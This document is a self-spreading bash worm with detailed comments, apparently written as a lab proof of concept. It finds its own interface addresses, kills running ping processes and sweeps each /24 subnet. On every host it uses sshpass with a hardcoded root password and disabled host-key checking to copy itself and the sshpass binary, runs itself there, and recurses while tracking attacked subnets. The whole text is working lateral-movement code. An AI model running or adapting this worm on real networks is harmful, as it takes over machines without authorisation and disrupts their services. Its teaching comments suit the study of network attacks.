# Invoke a bash shell to interpret the following script
#!/bin/bash

# Print the hostname of the machine we are currently running
    # on so that we can follow the script's "infection path".
echo "Running @ $(hostname)"

# Global variables:
    # rootpwd: Password used when SSHing to machines.
    # debug: Causes the script to dump the number of times
        # it is executed to a file. It MUST BE commented out
        # to be disabled.
rootpwd="1234"
debug="on"

# Check the times the script is run on a node when debugging.
if [ ! -z $debug ]
then
    # If the file '/n_runs' exists
    if [ -f /n_runs ]
    then
        # Read it and increment its value by 1.
        # Arithmetic is evealuated when enclosed by
            # an Arithmetic Expansion -> $(())
        # The '>' redirection operator will either
           # overwrite or create a file.
        echo $(( $(cat /n_runs) + 1 )) > /n_runs
    else
        echo 1 > /n_runs
    fi
fi

# Define an array containing the IPs for each interface.
iface_ips=($(ip a | awk '$1 ~ /inet/ && $2 !~ /127.0.0.1\/8/' | awk '{print $2}'))

# Store the number of IPs (i.e. the length of the iface_ips array).
n_ips=${#iface_ips[@]}

# Store the PID associateds to the ping process within the
    # container. We could have also used the 'killall'
    # utility that 'kills' processes by name. This
    # increased the number of needed dependencies however,
    # and we decided to do it ourselves.
ping_pid=$(ps -ax | grep ping | head -n 1 | awk '{print $1}')

# If we found a ping process (i.e. 'ping_pid' variable is
    # not empty).
if [ ! -z $ping_pid ]
then
    # Terminate the ping process and note down the time it
        # was taken down in the '/p_deaths' file. Note the
        # '>>' redirection operator appends data to a file
        # or creates it if it doesn't exist.
    kill $ping_pid
    echo "$(date),$(date +%s)" >> /p_deaths
else
    echo -e "\tNo ping found. Quitting..."
    exit
fi

# If we are currently running on a node (we only have a
    # single network interface) and we are not the
    # "entrypoint" for the attack we will exit. Some
    # other machine will carry on with the attack.
    # Deciding whether we are the entrypoint amounts
    # to checking whether the /entrypoint file exists.
if [ $n_ips -eq 1 ] && [ ! -f entrypoint ]
then
    echo -e "\tRegular node. Quitting..."
    exit
fi

# Inform the user what type of machine the attack is
    # currently at.
if [ ! -f /entrypoint ]
then
    echo -e "\tWe are a router!"
else
    echo -e "\tWe are at the entrypoint!"
fi

# Run the following on each interface through a for loop.
for (( i=0; i<${n_ips}; i++ ))
do
    # Leverage awk to find the interface's associated
        # subnetwork's network address and our own IP
        # address witin it.
    net_addr=$(echo "${iface_ips[i]}" | awk '{split($0,foo,"/"); split(foo[1],fuu,"."); print sprintf("%s.%s.%s.", fuu[1], fuu[2], fuu[3])}')
    our_ip=$(echo "${iface_ips[i]}" | awk '{split($0,foo,"/"); print foo[1]}')

    # If we are debugging, print the discovered network
        # and IP addresses.
    if [ ! -z $debug ]
    then
        echo -e "\tNet_addr: $net_addr\tIP: $our_ip"
    fi

    # If this subnetwork has no been attacked yet (i.e. it is
        # not contained in the '/victims' file) proceed to
        # attack it. The '/victims' file is copied to each
        # newly infected machine an contains a list of the
        # subnetwork's that have been attack so that we do
        # not attempt it again. This serves as a base case
        # for recursivity so that the attack does not run
        # indefinitely.
    if [ -z $(grep $net_addr /victims 2> /dev/null) ]
    then
        # Append this subnet to the victims list right away
            # as we are going to proceed to attack it.
        echo $net_addr >> /victims

        # As we know this is a '/24' subnetwork we know the
            # valid addresses range from X.X.X.1 to
            # X.X.X.254.
        for j in {1..254}
        do
            # We can generate the current victim's IP address
                # by appending the current ending ($j) to the
                # network address ($net_addr).
            if [ $net_addr$j != $our_ip ]
                then
                echo -e "\tCopying to -> $net_addr$j"

                # Copy the script itself, the '/victims' file
                    # and the 'sshpass' binary to the next
                    # victim with scp. We are using the '-o
                    # StrictHostKeyChecking=no' option with
                    # 'scp' because we want to avoid the "Do
                    # you trust this host..." or ECDSA prompt
                    # as this script is NOT interactive.
                /sshpass -p $rootpwd scp -o StrictHostKeyChecking=no /victims /p_stopper.sh /sshpass root@$net_addr$j:/ > /dev/null 2>&1

                # Run the script within that victim. This
                    # will cause the script to recur
                    # indifenitelyuntil there are no more
                    # subnetworks to attack. At that point,
                    # the attack will begin dismantling
                    # ping processes in a backwards fashion
                    # of compared to the order in which the
                    # attack itself was copied between
                    # machines.
                /sshpass -p $rootpwd ssh root@$net_addr$j "bash /p_stopper.sh" < /dev/null  2> /dev/null

                # Get an updated copy of the subnets which
                    # have been attacked to avoid attacking
                    # subnetworks twice.
                /sshpass -p $rootpwd scp -o StrictHostKeyChecking=no root@$net_addr$j:/victims /victims > /dev/null 2>&1

                # In order to check whether we have
                    # connectivity with the current
                    # IP we will ping it once (thanks
                    # to the '-c' option) whilst
                    # redirecting the output of both
                    # STDOUT and STDERR to /dev/null.
                    # We'll then look at ping's return
                    # code (through the $? variable
                    # the shell mantains which is the
                    # last return code) to check
                    # whether the current IP is alive
                    # or not. As seen in ping's manpage
                    # (man ping) one can indeed use this
                    # return code for this purpose. In
                    # other words, if ping returns with
                    # a 0 code then the host is alive.
                    # If the code is either 1 or 2 the
                    # current IP is not associated with
                    # any host and we will move on to
                    # attack another subnet. This
                    # assumes all the nodes reside in
                    # the lower end of the subnetwork's
                    # address space. This attack would
                    # work in the same way if this
                    # assumption were not feasible: we
                    # would just remove this last section
                    # chekcing whether the host is alive
                    # or not and just blindly continue
                    # until all the subnetwork's addresses
                    # were exhausted. However, given the
                    # size of /24 subnetworks this would
                    # be a time consuming process that
                    # we believe would add no value to
                    # the proof of concept.
                ping -c 1 $net_addr$j > /dev/null 2>&1

                # If the return code is not 0.
                if [ $? -ne 0 ]
                then
                    # Break from the current for loop and try
                        # to attack the next subnetwork.
                    echo -e "\tBreaking..."
                    break 1
                fi
                # After all the subnetworks have been
                    # attacked and we return to this
                    # node print it on screen so that
                    # we can follow the attack's path.
                echo -e "Back @ $(hostname)"
            fi
        done
    fi
done

# Clean the victims state unless we are debugging and we want
    # to take a look at it later on. Invoking 'rm' with the
    # '-f' flag prevents it from outputting an error message
    # in case the specified files don't exist.
if [ -z $debug ]
then
    rm -f /og_net /victims
fi
